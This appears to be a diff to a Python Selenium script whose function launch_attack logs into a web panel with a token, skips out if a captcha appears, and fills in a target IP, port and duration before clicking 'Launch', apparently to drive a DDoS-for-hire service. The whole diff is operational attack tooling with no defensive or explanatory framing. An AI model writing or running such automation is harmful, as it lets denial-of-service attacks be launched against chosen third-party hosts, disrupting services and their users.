@@ -50,32 +50,51 @@ def launch_attack(ip, port, duration):
         service = Service(GeckoDriverManager().install())
         driver = webdriver.Firefox(service=service, options=options)
         
-        # Login code yahan...
+        # Login first
+        driver.get(LOGIN_URL)
+        wait = WebDriverWait(driver, 10)
         
-        # Attack page
+        token_field = wait.until(EC.presence_of_element_located((By.NAME, "token")))
+        token_field.clear()
+        token_field.send_keys(WEBSITE_TOKEN)
+        
+        try:
+            captcha = driver.find_element(By.NAME, "captcha")
+            return False, "CAPTCHA_REQUIRED"
+        except:
+            pass
+        
+        login_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]")
+        login_btn.click()
+        time.sleep(3)
+        
+        # Go to attack page
         driver.get(WEBSITE_URL)
         wait = WebDriverWait(driver, 10)
         
-        # 🔥 YAHAN PE REPLACE KARO 🔥
-        inputs = wait.until(EC.presence_of_all_elements_located(
-            (By.CSS_SELECTOR, "input.w-full")
+        # 🔥 EXACT PLACEHOLDER-BASED SELECTORS 🔥
+        ip_field = wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//input[@placeholder='104.29.138.132']")
         ))
+        ip_field.clear()
+        ip_field.send_keys(ip)
         
-        if len(inputs) >= 3:
-            inputs[0].clear()
-            inputs[0].send_keys(ip)
-            
-            inputs[1].clear()
-            inputs[1].send_keys(str(port))
-            
-            inputs[2].clear()
-            inputs[2].send_keys(str(duration))
-        else:
-            return False, "❌ Input fields nahi mile"
+        port_field = driver.find_element(
+            By.XPATH, "//input[@placeholder='80']"
+        )
+        port_field.clear()
+        port_field.send_keys(str(port))
         
-        # Launch button click
+        duration_field = driver.find_element(
+            By.XPATH, "//input[@placeholder='60']"
+        )
+        duration_field.clear()
+        duration_field.send_keys(str(duration))
+        
+        # Click launch
         launch_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Launch')]")
         launch_btn.click()
+        time.sleep(3)
         
         return True, "SUCCESS"
         
